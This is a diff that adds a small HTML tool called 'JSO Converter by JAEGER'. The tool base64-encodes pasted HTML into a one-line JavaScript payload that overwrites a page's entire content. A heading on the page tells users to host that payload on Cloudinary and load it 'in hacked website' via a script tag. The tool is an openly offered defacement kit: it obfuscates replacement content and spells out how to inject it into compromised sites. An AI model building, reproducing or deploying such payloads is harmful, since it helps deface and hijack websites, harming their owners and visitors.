@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JSO Converter by JAEGER</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        h1, h2 {
+            text-align: center;
+            color: #333;
+        }
+
+        .container {
+            margin: 30px 0;
+        }
+
+        textarea {
+            width: 100%;
+            height: 200px;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            resize: vertical;
+        }
+
+        button {
+            background: #007bff;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            margin: 5px 0;
+        }
+
+        button:hover {
+            background: #0056b3;
+        }
+
+        .button-group {
+            display: flex;
+            gap: 10px;
+            margin: 10px 0;
+        }
+
+        #outputContainer {
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <h1>JSO Converter by JAEGER</h1>
+    
+    <div class="container">
+        <h2>Enter HTML Here</h2>
+        <textarea id="htmlInput" placeholder="Paste your HTML here..."></textarea>
+        <button onclick="convertToJSO()">Convert</button>
+    </div>
+
+    <div id="outputContainer">
+        <h2>JSO Output</h2>
+        <div class="button-group">
+            <textarea id="jsoOutput" disabled></textarea>
+            <button onclick="copyToClipboard()">Copy to Clipboard</button>
+        </div>
+    </div>
+    <div>
+	<h2>Host this code as <code>script.js</code> on cloudinary and use it in hacked website like <code>&lt;script src="cloudinary_link"&gt;&lt;script&gt;</code></h2>
+    </div>	 
+    <script>
+        function convertToJSO() {
+            const htmlInput = document.getElementById('htmlInput').value.trim();
+            const outputTextarea = document.getElementById('jsoOutput');
+
+            if (!htmlInput) {
+                alert('Please insert HTML to convert!');
+                return;
+            }
+
+            try {
+                const base64 = btoa(htmlInput);
+                const jsoCode = `document.documentElement.innerHTML=atob('${base64}')`;
+                outputTextarea.value = jsoCode;
+            } catch (error) {
+                alert('Error converting HTML. Please check your input.');
+            }
+        }
+
+        function copyToClipboard() {
+            const output = document.getElementById('jsoOutput');
+            
+            if (!output.value) {
+                alert('Nothing to copy!');
+                return;
+            }
+
+            output.select();
+            navigator.clipboard.writeText(output.value)
+                .then(() => alert('Copied to clipboard!'))
+                .catch(err => alert('Failed to copy!'));
+        }
+    </script>
+</body>
+</html>
